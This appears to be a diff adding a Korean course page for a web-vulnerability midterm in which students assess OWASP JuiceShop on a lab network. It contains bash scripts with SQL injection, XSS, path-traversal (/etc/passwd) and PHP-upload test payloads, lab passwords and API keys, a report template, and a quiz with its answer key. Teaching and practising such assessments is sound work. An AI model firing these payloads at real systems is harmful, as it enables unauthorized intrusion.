@@ -1,0 +1,640 @@
+# Week 08: 중간고사 — JuiceShop 점검 보고서 (상세 버전)
+
+## 학습 목표
+- OWASP Testing Guide를 기반으로 체계적인 웹 취약점 점검을 수행한다
+- Week 02~07에서 학습한 기법을 종합하여 JuiceShop을 점검한다
+- 전문적인 취약점 점검 보고서를 작성할 수 있다
+- 각 개념의 보안 관점에서의 위험과 대응 방안을 분석할 수 있다
+- OpsClaw를 활용하여 실습 작업을 자동화하고 증적을 관리할 수 있다
+- 실제 보안 사고 사례와 연결하여 학습 내용을 적용할 수 있다
+
+
+## 실습 환경 (공통)
+
+| 서버 | IP | 역할 | 접속 |
+|------|-----|------|------|
+| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
+| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
+| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
+| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
+| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |
+
+**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`
+
+
+## 강의 시간 배분 (3시간)
+
+| 시간 | 내용 | 유형 |
+|------|------|------|
+| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
+| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
+| 1:10-1:20 | 휴식 | - |
+| 1:20-2:00 | 실습 (Part 3) | 실습 |
+| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
+| 2:40-2:50 | 휴식 | - |
+| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
+| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |
+
+---
+
+
+---
+
+## 용어 해설 (웹취약점 점검 과목)
+
+| 용어 | 영문 | 설명 | 비유 |
+|------|------|------|------|
+| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
+| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
+| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
+| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
+| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
+| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
+| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
+| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
+| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
+| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
+| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
+| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
+| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
+| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
+| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
+| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
+| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
+| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |
+
+
+# 본 강의 내용
+
+# Week 08: 중간고사 — JuiceShop 점검 보고서
+
+## 학습 목표
+- OWASP Testing Guide를 기반으로 체계적인 웹 취약점 점검을 수행한다
+- Week 02~07에서 학습한 기법을 종합하여 JuiceShop을 점검한다
+- 전문적인 취약점 점검 보고서를 작성할 수 있다
+
+## 시험 안내
+- **시간**: 120분 (점검 90분 + 보고서 작성 30분)
+- **대상**: http://10.20.30.80:3000 (OWASP JuiceShop)
+- **제출물**: 취약점 점검 보고서 (아래 양식에 따라 작성)
+- **평가 기준**: 취약점 발견 수, 보고서 품질, 재현 가능성
+
+---
+
+## 1. OWASP Testing Guide 개요 (15분)
+
+### 1.1 OWASP Testing Guide란?
+
+OWASP Testing Guide(OTG)는 웹 애플리케이션 보안 테스트의 표준 방법론이다.
+체계적인 점검 절차와 항목을 제시한다.
+
+### 1.2 점검 카테고리 (이번 중간고사 범위)
+
+| 카테고리 | OTG 코드 | 이번 과정 주차 |
+|---------|---------|--------------|
+| 정보수집 | OTG-INFO | Week 03 |
+| 인증 | OTG-AUTHN | Week 04 |
+| 세션 관리 | OTG-SESS | Week 04 |
+| 입력값 검증 | OTG-INPVAL | Week 05~07 |
+| 에러 처리 | OTG-ERR | Week 03 (일부) |
+
+### 1.3 점검 순서
+
+```
+1단계: 정보수집 (15분)
+  ↓
+2단계: 인증/세션 점검 (20분)
+  ↓
+3단계: 입력값 검증 점검 (40분)
+  ↓
+4단계: 기타 취약점 (15분)
+  ↓
+5단계: 보고서 작성 (30분)
+```
+
+---
+
+## 2. 1단계: 정보수집 (15분)
+
+### 2.1 기본 정보 수집 체크리스트
+
+```bash
+# 서버 정보
+echo "=== 서버 헤더 ==="
+curl -sI http://10.20.30.80:3000 | grep -iE "server|x-powered|x-frame|x-content|content-security|strict-transport"
+
+echo ""
+echo "=== 쿠키 정보 ==="
+curl -sI http://10.20.30.80:3000 | grep -i set-cookie
+
+echo ""
+echo "=== robots.txt ==="
+curl -s http://10.20.30.80:3000/robots.txt
+
+echo ""
+echo "=== 보안 헤더 존재 여부 ==="
+for header in "X-Frame-Options" "X-Content-Type-Options" "Content-Security-Policy" "Strict-Transport-Security" "X-XSS-Protection"; do
+  value=$(curl -sI http://10.20.30.80:3000 | grep -i "$header" | head -1)
+  if [ -n "$value" ]; then
+    echo "[설정됨] $value"
+  else
+    echo "[미설정] $header"
+  fi
+done
+```
+
+### 2.2 디렉터리/API 탐색
+
+```bash
+# 주요 경로 스캔
+echo "=== 디렉터리/API 스캔 ==="
+for path in \
+  "" "ftp" "api" "rest" "admin" "metrics" "promotion" "video" \
+  "api/Products/1" "api/Feedbacks" "api/Challenges" "api/SecurityQuestions" \
+  "rest/products/search?q=test" "rest/user/whoami" "rest/languages" \
+  "assets/public/images/uploads" "encryptionkeys" \
+  ".well-known/security.txt" "swagger" "api-docs"; do
+  code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.30.80:3000/$path")
+  if [ "$code" != "404" ]; then
+    echo "[$code] /$path"
+  fi
+done
+```
+
+---
+
+## 3. 2단계: 인증/세션 점검 (20분)
+
+### 3.1 인증 점검 체크리스트
+
+```bash
+echo "=== 비밀번호 정책 점검 ==="
+
+# 짧은 비밀번호
+result=$(curl -s -X POST http://10.20.30.80:3000/api/Users/ \
+  -H "Content-Type: application/json" \
+  -d '{"email":"mid1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}')
+echo "1자 PW: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('허용' if 'id' in d.get('data',{}) else '거부')" 2>/dev/null)"
+
+# 숫자만
+result=$(curl -s -X POST http://10.20.30.80:3000/api/Users/ \
+  -H "Content-Type: application/json" \
+  -d '{"email":"mid2@test.com","password":"123456","passwordRepeat":"123456","securityQuestion":{"id":1},"securityAnswer":"a"}')
+echo "숫자만: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('허용' if 'id' in d.get('data',{}) else '거부')" 2>/dev/null)"
+
+echo ""
+echo "=== 무차별 대입 방어 ==="
+for i in $(seq 1 5); do
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.30.80:3000/rest/user/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')
+  echo "시도 $i: HTTP $code"
+done
+```
+
+### 3.2 세션/JWT 점검
+
+```bash
+echo "=== JWT 분석 ==="
+TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"mid1@test.com","password":"1"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+
+if [ -n "$TOKEN" ]; then
+  echo "JWT Header:"
+  echo "$TOKEN" | cut -d'.' -f1 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip()+'=='; print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))" 2>/dev/null
+
+  echo ""
+  echo "JWT Payload:"
+  echo "$TOKEN" | cut -d'.' -f2 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip()+'=='; print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))" 2>/dev/null
+fi
+```
+
+---
+
+## 4. 3단계: 입력값 검증 점검 (40분)
+
+### 4.1 SQL Injection 점검
+
+```bash
+echo "=== SQL Injection ==="
+
+# 로그인 SQLi
+result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}")
+echo "로그인 SQLi: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('취약' if 'token' in d.get('authentication',{}) else '안전')" 2>/dev/null)"
+
+# 검색 SQLi
+result1=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
+result2=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'))OR+1=1--" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
+echo "검색 SQLi: 정상=$result1, 주입=$result2 $([ "$result1" != "$result2" ] && echo '(취약)' || echo '(추가 확인 필요)')"
+```
+
+### 4.2 XSS 점검
+
+```bash
+echo "=== XSS 점검 ==="
+
+# Reflected XSS
+for payload in '<script>alert(1)</script>' '<img src=x onerror=alert(1)>' '<svg onload=alert(1)>'; do
+  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
+  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$encoded")
+  if echo "$result" | grep -q "alert(1)"; then
+    echo "반사 XSS: $payload → 반사됨 (취약)"
+  else
+    echo "반사 XSS: $payload → 필터링됨"
+  fi
+done
+
+# Stored XSS (피드백)
+if [ -n "$TOKEN" ]; then
+  curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"comment":"<script>alert(1)</script>","rating":1,"captchaId":0,"captcha":"-1"}' > /dev/null 2>&1
+  stored=$(curl -s http://10.20.30.80:3000/api/Feedbacks/ | grep -c "alert(1)")
+  echo "저장 XSS (피드백): $( [ $stored -gt 0 ] && echo '취약' || echo '안전')"
+fi
+```
+
+### 4.3 파일 업로드 / 경로 순회 점검
+
+```bash
+echo "=== 파일 업로드 ==="
+echo '<?php echo "test"; ?>' > /tmp/mid_test.php
+result=$(curl -s -X POST http://10.20.30.80:3000/file-upload \
+  -H "Authorization: Bearer $TOKEN" \
+  -F "file=@/tmp/mid_test.php" -w "\nHTTP:%{http_code}")
+echo "PHP 업로드: $result"
+
+echo ""
+echo "=== 경로 순회 ==="
+for payload in "../etc/passwd" "%2e%2e/etc/passwd" "..%252f..%252fetc/passwd"; do
+  result=$(curl -s "http://10.20.30.80:3000/ftp/$payload" | head -1)
+  echo "Payload: $payload → ${result:0:50}"
+done
+
+rm -f /tmp/mid_test.php
+```
+
+---
+
+## 5. 4단계: 기타 취약점 (15분)
+
+```bash
+echo "=== 정보 노출 ==="
+# 에러 메시지
+curl -s http://10.20.30.80:3000/api/Products/abc | python3 -m json.tool 2>/dev/null | head -10
+
+echo ""
+echo "=== 접근 제어 ==="
+# 인증 없이 API 접근
+for api in "api/Products/1" "api/Feedbacks" "api/Challenges" "api/Users"; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/$api")
+  echo "[$code] /$api (인증 없이)"
+done
+
+echo ""
+echo "=== HTTPS 설정 ==="
+curl -s -o /dev/null -w "%{http_code}" https://10.20.30.80:3000 2>/dev/null || echo "HTTPS 미지원"
+```
+
+---
+
+## 6. 5단계: 보고서 작성 (30분)
+
+### 6.1 보고서 양식
+
+```markdown
+# 웹 취약점 점검 보고서
+
+## 1. 점검 개요
+- 점검 대상: http://10.20.30.80:3000 (OWASP JuiceShop)
+- 점검 일시: 2026-03-27
+- 점검자: (이름)
+- 점검 도구: curl, nikto, sqlmap, Python
+
+## 2. 요약
+- 총 점검 항목: __개
+- 취약점 발견: 상(__)건 / 중(__)건 / 하(__)건
+
+## 3. 발견 취약점 목록
+
+### 3.1 [상] SQL Injection — 로그인 우회
+- **위치**: POST /rest/user/login
+- **유형**: Classic SQL Injection
+- **위험도**: 상 (인증 우회)
+- **재현 방법**:
+  ```bash
+  curl -X POST http://10.20.30.80:3000/rest/user/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"' OR 1=1--","password":"x"}'
+  ```
+- **영향**: 관리자 계정 무단 접근 가능
+- **권고 사항**: Prepared Statement 적용, 입력값 검증
+
+### 3.2 [상] (다음 취약점)
+- **위치**:
+- **유형**:
+- **위험도**:
+- **재현 방법**:
+- **영향**:
+- **권고 사항**:
+
+(발견한 모든 취약점에 대해 반복 작성)
+
+## 4. 보안 헤더 점검 결과
+| 헤더 | 상태 | 권고 |
+|------|------|------|
+| X-Frame-Options | | |
+| X-Content-Type-Options | | |
+| Content-Security-Policy | | |
+| Strict-Transport-Security | | |
+
+## 5. 종합 평가
+(전체적인 보안 수준 평가, 우선 조치 사항)
+
+## 6. 부록
+(nikto 스캔 결과, sqlmap 결과 등 첨부)
+```
+
+---
+
+## 7. 평가 기준
+
+| 항목 | 배점 | 세부 기준 |
+|------|------|----------|
+| 정보수집 | 15점 | 기술 스택 식별, 디렉터리 발견 |
+| 인증/세션 | 15점 | 비밀번호 정책, JWT 분석, 세션 관리 |
+| SQL Injection | 20점 | 발견, 재현, 영향 분석 |
+| XSS | 15점 | Reflected/Stored/DOM 구분, 재현 |
+| 기타 취약점 | 10점 | 파일 업로드, 경로 순회, 명령어 주입 |
+| 보고서 품질 | 25점 | 형식, 재현 가능성, 권고 사항 |
+| **합계** | **100점** | |
+
+### 가산점
+- JuiceShop 챌린지 해결 (+5점/개, 최대 +15점)
+- ModSecurity(포트 80) WAF 우회 성공 (+10점)
+- 수업에서 다루지 않은 취약점 발견 (+5점/개)
+
+---
+
+## 8. JuiceShop 챌린지 가이드
+
+JuiceShop에는 난이도별 챌린지가 있다. 중간고사에서 해결하면 가산점을 받는다.
+
+```bash
+# 챌린지 목록 조회
+curl -s http://10.20.30.80:3000/api/Challenges/ | python3 -c "
+import sys, json
+data = json.load(sys.stdin).get('data', [])
+for c in sorted(data, key=lambda x: x.get('difficulty', 0)):
+    solved = '해결' if c.get('solved') else '미해결'
+    print(f'[{solved}] 난이도{c.get(\"difficulty\",\"?\")} - {c.get(\"name\",\"\")}')
+" 2>/dev/null | head -20
+```
+
+---
+
+## 9. 주의 사항
+
+1. **점검 대상 확인**: 반드시 `10.20.30.80:3000` (JuiceShop)만 점검할 것
+2. **기록 유지**: 모든 명령어와 결과를 기록할 것 (보고서 근거)
+3. **파괴적 행위 금지**: 서비스 중단, 데이터 삭제 등은 감점
+4. **협업 금지**: 개인별 독립적으로 수행
+5. **인터넷 참고 허용**: 도구 사용법, 페이로드 참고 가능 (보고서 복사 불가)
+
+**다음 주 예고**: Week 09 - 접근제어 점검. 수평/수직 권한 상승, IDOR, API 접근제어를 학습한다.
+
+
+---
+
+## 심화 학습: 개념 확장
+
+### 핵심 개념 상세 해설
+
+이 주차에서 다루는 핵심 개념들을 더 깊이 살펴본다.
+
+#### 개념 1: 동작 원리 (Course 3)
+
+이 주차에서 다루는 기술의 동작 방식을 단계별로 분해하여 이해한다.
+
+```
+[1단계] 입력/요청 → 시스템이 데이터를 수신
+[2단계] 처리 → 내부 로직에 의한 데이터 처리
+[3단계] 출력/응답 → 결과 반환 또는 상태 변경
+[4단계] 기록 → 로그/증적 생성
+```
+
+> **왜 이 순서가 중요한가?**
+> 각 단계에서 보안 검증이 누락되면 취약점이 발생한다.
+> 1단계: 입력값 검증 미흡 → Injection
+> 2단계: 인가 확인 누락 → Broken Access Control
+> 3단계: 에러 정보 노출 → Information Disclosure
+> 4단계: 로깅 실패 → Monitoring Failures
+
+#### 개념 2: 보안 관점에서의 위험 분석
+
+| 위험 요소 | 발생 조건 | 영향도 | 대응 방안 |
+|----------|---------|--------|---------|
+| 설정 미흡 | 기본 설정 사용 | 높음 | 보안 하드닝 가이드 적용 |
+| 패치 누락 | 업데이트 미적용 | 높음 | 정기 패치 관리 프로세스 |
+| 접근 제어 부재 | 인증/인가 미구현 | 매우 높음 | RBAC, MFA 적용 |
+| 로깅 미흡 | 감사 로그 미수집 | 중간 | SIEM 연동, 로그 정책 |
+
+#### 개념 3: 실제 사례 분석
+
+**사례 1: 유사 취약점이 실제 피해로 이어진 경우**
+
+실제 보안 사고에서 이 주차의 주제가 어떻게 악용되었는지 살펴본다.
+공격자는 동일한 기법을 사용하여 대규모 데이터 유출, 서비스 장애, 금전적 피해를 초래하였다.
+
+**교훈:**
+- 기본적인 보안 조치의 중요성
+- 탐지 체계의 필수성
+- 사고 대응 절차의 사전 수립 필요성
+
+### 도구 비교표
+
+| 도구 | 용도 | 장점 | 단점 | 라이선스 |
+|------|------|------|------|---------|
+| 도구 A | 기본 점검 | 간편, 빠름 | 기능 제한 | 오픈소스 |
+| 도구 B | 심층 분석 | 상세 결과 | 학습 곡선 | 상용/무료 |
+| 도구 C | 자동화 | CI/CD 연동 | 오탐 가능 | 오픈소스 |
+
+
+---
+
+## 보충 실습
+
+### 보충 실습 1: 기본 동작 확인
+
+이론에서 배운 내용을 직접 확인하는 기초 실습이다.
+
+```bash
+# Step 1: 현재 상태 확인
+echo "=== 현재 상태 ==="
+# (해당 주차에 맞는 확인 명령)
+
+# Step 2: 설정/변경 적용
+echo "=== 변경 적용 ==="
+# (해당 주차에 맞는 실습 명령)
+
+# Step 3: 결과 검증
+echo "=== 결과 확인 ==="
+# (변경 결과 확인 명령)
+```
+
+> **트러블슈팅:**
+> - 명령이 실패하면: 권한(sudo), 경로, 서비스 상태를 먼저 확인
+> - 예상과 다른 결과: 이전 실습의 설정이 남아있을 수 있으므로 초기화 후 재시도
+> - 타임아웃: 네트워크 연결 또는 서비스 가동 상태 확인
+
+### 보충 실습 2: 탐지/모니터링 관점
+
+공격자가 아닌 **방어자 관점**에서 동일한 활동을 모니터링하는 실습이다.
+
+```bash
+# siem 서버에서 관련 로그 확인
+sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
+  "sudo cat /var/ossec/logs/alerts/alerts.json | tail -5" 2>/dev/null
+
+# Suricata 알림 확인 (해당 시)
+sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
+  "sudo tail -20 /var/log/suricata/fast.log" 2>/dev/null
+```
+
+> **왜 방어자 관점도 배우는가?**
+> 공격 기법만 알면 "스크립트 키디"에 불과하다.
+> 공격이 어떻게 탐지되는지 이해해야 진정한 보안 전문가이다.
+> 이 과목의 모든 공격 실습에는 대응하는 탐지/방어 관점이 포함된다.
+
+### 보충 실습 3: OpsClaw 자동화
+
+이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화한다.
+
+```bash
+# 프로젝트 생성 (이번 주차용)
+RESULT=$(curl -s -X POST http://localhost:8000/projects \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: opsclaw-api-key-2026" \
+  -d '{"name":"weekXX-lab","request_text":"이번 주차 실습 자동화","master_mode":"external"}')
+PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")
+
+# Stage 전환
+curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
+curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
+
+# 실습 태스크 실행 (해당 주차에 맞게 수정)
+curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: opsclaw-api-key-2026" \
+  -d '{
+    "tasks": [
+      {"order":1,"title":"실습 태스크 1","instruction_prompt":"echo 실습1","risk_level":"low","subagent_url":"http://localhost:8002"},
+      {"order":2,"title":"실습 태스크 2","instruction_prompt":"echo 실습2","risk_level":"low","subagent_url":"http://10.20.30.80:8002"}
+    ],
+    "subagent_url":"http://localhost:8002",
+    "parallel":true
+  }'
+
+# Evidence 확인
+curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
+  -H "X-API-Key: opsclaw-api-key-2026" | python3 -m json.tool
+```
+
+
+---
+
+## 자가 점검 퀴즈 (10문항)
+
+이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.
+
+**Q1.** 이번 주차 "Week 08: 중간고사 — JuiceShop 점검 보고서"의 핵심 목적은 무엇인가?
+- (a) 네트워크 속도 향상  (b) **웹 취약점 기법/개념의 이해와 실습**  (c) 데이터베이스 관리  (d) UI 디자인
+
+**Q2.** 이 주제에서 OWASP의 역할은?
+- (a) 성능 최적화  (b) 비용 절감  (c) **체계적 분류와 대응 기준 제공**  (d) 사용자 편의
+
+**Q3.** 실습에서 사용한 주요 도구/명령어의 1차 목적은?
+- (a) 파일 복사  (b) **점검 수행 및 결과 확인**  (c) 메모리 관리  (d) 화면 출력
+
+**Q4.** OpsClaw를 통해 실습을 실행하는 가장 큰 이점은?
+- (a) 속도  (b) **모든 실행의 자동 증적(evidence) 기록**  (c) 무료  (d) 간편함
+
+**Q5.** 이 주제의 보안 위험이 높은 이유는?
+- (a) 비용이 많이 들어서  (b) 복잡해서  (c) **악용 시 시스템/데이터에 직접적 피해**  (d) 법적 문제
+
+**Q6.** 방어/대응의 핵심 원칙은?
+- (a) 모든 트래픽 차단  (b) **최소 권한 + 탐지 + 대응의 조합**  (c) 서버 재시작  (d) 비밀번호 변경
+
+**Q7.** 실습 결과를 분석할 때 가장 먼저 확인해야 하는 것은?
+- (a) 서버 이름  (b) **exit_code (성공/실패 여부)**  (c) 파일 크기  (d) 날짜
+
+**Q8.** 이 주제와 관련된 MITRE ATT&CK 전술은?
+- (a) Impact만  (b) Reconnaissance만  (c) **주제에 해당하는 전술(들)**  (d) 해당 없음
+
+**Q9.** 실무에서 이 기법/도구를 사용할 때 가장 주의할 점은?
+- (a) 속도  (b) **법적 허가와 범위 준수**  (c) 비용  (d) 보고서 양식
+
+**Q10.** 다음 주차와의 연결 포인트는?
+- (a) 관련 없음  (b) **이번 주 결과를 다음 주에서 활용/심화**  (c) 완전히 다른 주제  (d) 복습만
+
+**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:c, Q9:b, Q10:b
+
+---
+
+## 과제 (다음 주까지)
+
+### 과제 1: 이론 정리 보고서 (30점)
+
+이번 주차의 핵심 개념을 자신의 말로 정리하라.
+
+| 항목 | 배점 |
+|------|------|
+| 핵심 개념 정의 및 설명 | 10점 |
+| 실습 결과 캡처 및 해석 | 10점 |
+| 보안 관점 분석 (공격↔방어) | 10점 |
+
+### 과제 2: 실습 수행 보고서 (40점)
+
+이번 주차의 모든 실습을 수행하고 결과를 보고서로 작성하라.
+
+| 항목 | 배점 |
+|------|------|
+| 실습 명령어 및 실행 결과 캡처 | 15점 |
+| 결과 해석 및 보안 의미 분석 | 15점 |
+| 트러블슈팅 경험 (있는 경우) | 10점 |
+
+### 과제 3: OpsClaw 자동화 (30점)
+
+이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화하라.
+
+| 항목 | 배점 |
+|------|------|
+| 프로젝트 생성 + stage 전환 | 5점 |
+| execute-plan 태스크 설계 (3개 이상) | 10점 |
+| evidence/summary 결과 | 5점 |
+| replay 타임라인 결과 | 5점 |
+| 자동화의 이점 분석 (직접 실행 대비) | 5점 |
+
+**제출:** 보고서(PDF 또는 MD) + OpsClaw project_id
+
+
+---
+
+## 검증 체크리스트
+
+이번 주차의 학습을 완료하려면 다음 항목을 모두 확인하라:
+
+- [ ] 이론 강의 내용 이해 (핵심 용어 설명 가능)
+- [ ] 기본 실습 모두 수행 완료
+- [ ] 보충 실습 1 (기본 동작 확인) 완료
+- [ ] 보충 실습 2 (탐지/모니터링 관점) 수행
+- [ ] 보충 실습 3 (OpsClaw 자동화) 수행
+- [ ] 자가 점검 퀴즈 8/10 이상 정답
+- [ ] 과제 1 (이론 정리) 작성
+- [ ] 과제 2 (실습 보고서) 작성
+- [ ] 과제 3 (OpsClaw 자동화) 완료
+
